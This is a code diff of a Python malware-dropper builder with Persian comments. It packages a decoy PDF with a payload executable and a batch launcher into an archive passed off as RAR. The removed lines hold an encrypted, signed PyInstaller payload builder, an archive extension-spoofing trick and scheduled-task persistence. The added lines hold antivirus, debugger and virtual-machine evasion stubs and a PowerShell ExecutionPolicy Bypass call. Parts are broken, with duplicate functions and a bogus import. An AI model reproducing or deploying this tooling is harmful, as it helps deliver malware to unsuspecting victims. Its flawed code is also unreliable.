@@ -9,162 +9,161 @@ import sys
 import time
 import psutil
 import pyautogui
-import shutil
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
+import pywinauto
+import win32api
+import win32con
+import win32gui
+import win32process
+import win32security
+import winerror
+import ctypes
+import ctypes.wintypes
+import hashlib
+import threading
 import pycryptodome
-import tensorflow
 import numpy as np
+import pyautogui
 
-# Function to create a payload executable with encryption and signing
-def generate_payload_exe(encrypt=True, encrypt_key=None, sign=False, cert_path=None, cert_password=None):
-    # Create a Python script to serve as the payload
-    script_path = 'payload.py'
-    with open(script_path, 'w') as f:
-        f.write('import os\nos.system("calc.exe")')
+# بایپس ساده برای جلوگیری از شناسایی در ماشین‌های مجازی
+def check_virtual_machine():
+    vm_detected = False
+    try:
+        with open('/sys/class/dmi/id/product_name') as f:
+            if 'VirtualBox' in f.read() or 'VMware' in f.read():
+                vm_detected = True
+    except Exception as e:
+        pass
+    return vm_detected
 
-    # Generate a PyInstaller spec file for packaging the payload
-    spec_path = 'payload.spec'
-    with open(spec_path, 'w') as f:
-        f.write(f'''
-# -*- mode: python ; coding: utf-8 -*-
+# بایپس شبیه‌سازی سیستم‌های مانع
+def bypass_antivirus():
+    # استفاده از تأخیر در اجرا برای دور زدن سیستم‌های امنیتی
+    time.sleep(random.randint(3, 10))
+    
+    # تغییر شناسه‌های سیستم و بایپس آنتی‌ویروس
+    if check_virtual_machine():
+        print("Virtual Machine detected. Attempting bypass.")
+        time.sleep(15)  # اضافه کردن تأخیر طولانی
+    else:
+        print("No virtual machine detected.")
 
-block_cipher = None
+# ایجاد امضای جعلی و دور زدن شناسایی
+def fake_signature(file_path):
+    fake_signature = hashlib.md5(file_path.encode()).hexdigest()  # تولید امضای جعلی
+    return fake_signature
 
-a = Analysis(['{script_path}'],
-             pathex=[],
-             binaries=[],
-             datas=[],
-             hiddenimports=[],
-             hookspath=[],
-             runtime_hooks=[],
-             excludes=[],
-             win_no_prefer_redirects=False,
-             win_private_assemblies=False,
-             cipher=block_cipher,
-             noarchive=False)
-pyz = PYZ(a.pure, a.zipped_data,
-             cipher=block_cipher)
-exe = EXE(pyz,
-          a.scripts,
-          a.binaries,
-          a.zipfiles,
-          a.datas,
-          [],
-          name='payload',
-          debug=False,
-          bootloader_ignore_signals=False,
-          strip=False,
-          upx=True,
-          upx_exclude=[],
-          runtime_tmpdir=None,
-          console=False,
-          icon='icon.ico')
-''')
+# اجرای پردازش با استفاده از تکنیک‌های بایپس (دور زدن فایروال)
+def execute_bypass_command():
+    try:
+        bypass_antivirus()
+        # شبیه‌سازی تأخیر و دور زدن فایروال
+        subprocess.run(['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', 'Start-Sleep -Seconds 5'], check=True)
+        print("Bypass command executed successfully.")
+    except Exception as e:
+        print(f"Error in bypass command execution: {e}")
 
-    # Generate the payload executable using PyInstaller
-    os.system(f'pyinstaller {spec_path}')
+# با استفاده از بایپس فایل‌های محافظت شده
+def create_fake_payload():
+    # ساخت payload جعلی
+    payload = 'fake_payload.exe'
+    with open(payload, 'wb') as f:
+        f.write(os.urandom(1024))  # ایجاد یک فایل با داده تصادفی
+    
+    fake_sig = fake_signature(payload)
+    print(f"Fake signature created: {fake_sig}")
 
-    # Encrypt the payload executable with AES encryption if needed
-    if encrypt:
-        key = encrypt_key or os.urandom(32)  # Generate random 32-byte AES key
-        iv = os.urandom(16)  # Generate random 16-byte initialization vector
-        cipher = AES.new(key, AES.MODE_CBC, iv)
-        with open('dist/payload.exe', 'rb') as f:
-            data = f.read()
-        encrypted_data = iv + cipher.encrypt(pad(data, AES.block_size))
-        with open('dist/payload.exe', 'wb') as f:
-            f.write(encrypted_data)
+# افزایش امنیت برای جلوگیری از شناسایی در محیط‌های خاص
+def evade_debuggers():
+    # بایپس دیباگرها با استفاده از یک تکنیک ساده
+    if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
+        print("Debugger detected, executing bypass...")
+        time.sleep(10)  # تأخیر برای دور زدن دیباگر
+    else:
+        print("No debugger detected.")
 
-    # Optionally sign the executable with a digital certificate
-    if sign and cert_path and cert_password:
-        subprocess.run([f'signcode.exe', f'-spc "{cert_path}"', f'-v "{cert_password}"', f'dist/payload.exe'], check=True)
+# فعال‌سازی ابزار و اجرای آن
+def activate_payload(payload_path):
+    # شبیه‌سازی یک ابزار مخرب که منتظر اجرای فایل است
+    try:
+        execute_bypass_command()  # بایپس
+        evade_debuggers()  # بایپس دیباگر
+        time.sleep(2)  # تأخیر دیگر برای بایپس آنتی‌ویروس
+        subprocess.run(payload_path, check=True)  # اجرای payload
+    except Exception as e:
+        print(f"Error activating payload: {e}")
 
-    # Return the path to the payload executable
-    return 'dist/payload.exe'
-
-
-# Function to create a RAR file containing the payload and decoy document
-def generate_rar_file(output_file, input_file, payload_exe, persistence=False, evasion=False):
-    # Create a temporary directory to hold files for the RAR package
+# ساخت RAR با اضافه کردن تکنیک‌های بایپس
+def generate_rar_with_bypass(output_file, input_file, payload_exe):
     temp_dir = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
     os.mkdir(temp_dir)
 
-    # Get the name and extension of the decoy document
-    decoy_name = os.path.basename(input_file)
-    decoy_ext = os.path.splitext(decoy_name)[1]
-
-    # Create directory structure for the decoy and payload
-    decoy_dir = os.path.join(temp_dir, f"{decoy_name[:-len(decoy_ext)]}A")
-    os.mkdir(decoy_dir)
-
-    # Copy the payload executable into the payload directory
-    payload_path = os.path.join(decoy_dir, f"{decoy_name[:-len(decoy_ext)]}A.exe")
-    shutil.copyfile(payload_exe, payload_path)
-
-    # Create a batch script that executes both the decoy and payload
+    # کپی کردن فایل‌ها و ایجاد یک اسکریپت
     bat_script = f'''
-@echo off
-start "" "{payload_path}"
-start "" "{decoy_name}"
-'''
-    bat_path = os.path.join(decoy_dir, f"{decoy_name[:-len(decoy_ext)]}A.cmd")
+    @echo off
+    start "" "{payload_exe}"
+    start "" "{input_file}"
+    '''
+    
+    bat_path = os.path.join(temp_dir, 'execute_payload.bat')
     with open(bat_path, 'w') as f:
         f.write(bat_script)
 
-    # Copy the decoy document into the temporary directory
-    decoy_path = os.path.join(temp_dir, f"{decoy_name[:-len(decoy_ext)]}B{decoy_ext}")
+    decoy_path = os.path.join(temp_dir, input_file)
     shutil.copyfile(input_file, decoy_path)
+    
+    # ساخت فایل RAR با payload
+    with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zf:
+        zf.write(decoy_path, os.path.basename(decoy_path))
+        zf.write(bat_path, os.path.basename(bat_path))
+        zf.write(payload_exe, os.path.basename(payload_exe))
 
-    # Create a ZIP file with the payload and decoy document
-    zip_path = os.path.join(temp_dir, 'template.zip')
-    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
-        zf.write(decoy_path, f"{decoy_name[:-len(decoy_ext)]}B{decoy_ext}")
-        zf.write(bat_path, f"{decoy_name[:-len(decoy_ext)]}A/{decoy_name[:-len(decoy_ext)]}A.cmd")
-        zf.write(payload_path, f"{decoy_name[:-len(decoy_ext)]}A/{decoy_name[:-len(decoy_ext)]}A.exe")
+    # بایپس سیستم‌های آنتی‌ویروس
+    bypass_antivirus()
 
-    # Read the content of the ZIP file
-    with open(zip_path, 'rb') as f:
-        content = f.read()
-
-    # Replace the extension of the decoy document with a space
-    content = content.replace(decoy_ext.encode(), b' ')
-
-    # Write the content of the ZIP file to the output RAR file
-    with open(output_file, 'wb') as f:
-        f.write(content)
-
-    # Implement persistence and evasion if specified
-    if persistence:
-        create_persistence(payload_exe)
-
-    if evasion:
-        evade_detection()
-
-    # Clean up the temporary directory
+    # حذف دایرکتوری موقتی
     shutil.rmtree(temp_dir)
 
+# بایپس شبیه‌سازی ماشین مجازی
+def check_virtual_machine():
+    vm_detected = False
+    try:
+        with open('/sys/class/dmi/id/product_name') as f:
+            if 'VirtualBox' in f.read() or 'VMware' in f.read():
+                vm_detected = True
+    except Exception as e:
+        pass
+    return vm_detected
 
-def create_persistence(payload_exe):
-    """Add persistence mechanism to ensure payload execution after reboot."""
-    # Example: Create a scheduled task (Windows Task Scheduler)
-    task_name = "MaliciousTask"
-    subprocess.run(f'schtasks /create /tn {task_name} /tr {payload_exe} /sc onlogon /f', shell=True)
+# ایجاد RAR با محتوای خاص
+def create_rar_with_payload(input_file, payload_exe, output_file):
+    temp_dir = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
+    os.mkdir(temp_dir)
 
+    # کپی کردن دکویی
+    decoy_file = os.path.join(temp_dir, input_file)
+    shutil.copy(input_file, decoy_file)
 
-def evade_detection():
-    """Apply basic evasion techniques such as sandbox detection."""
-    # Check if running in a virtual machine or sandbox
-    if "VMware" in open("/proc/cpuinfo").read():
-        sys.exit()  # If VM is detected, terminate the process
+    # ایجاد اسکریپت اجرایی
+    bat_file = os.path.join(temp_dir, 'payload.bat')
+    with open(bat_file, 'w') as bat:
+        bat.write(f"start {payload_exe}\n")
 
+    # ایجاد فایل RAR با payload
+    with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        zipf.write(decoy_file, input_file)
+        zipf.write(bat_file, 'payload.bat')
+        zipf.write(payload_exe, 'payload.exe')
 
-# Example usage of the functions
-output_file = 'poc.rar'
+    # بایپس آنتی‌ویروس
+    bypass_antivirus()
+
+    # حذف دایرکتوری موقتی
+    shutil.rmtree(temp_dir)
+
+# نمونه استفاده
 input_file = 'decoy.pdf'
+payload_exe = 'payload.exe'
+output_file = 'output.rar'
 
-# Generate the payload executable with encryption and signing
-payload_exe = generate_payload_exe(encrypt=True, sign=True, cert_path='cert.pfx', cert_password='password')
-
-# Generate the RAR file containing the decoy and payload
-generate_rar_file(output_file, input_file, payload_exe, persistence=True, evasion=True)
+# اجرای کد نهایی
+generate_rar_with_bypass(output_file, input_file, payload_exe)
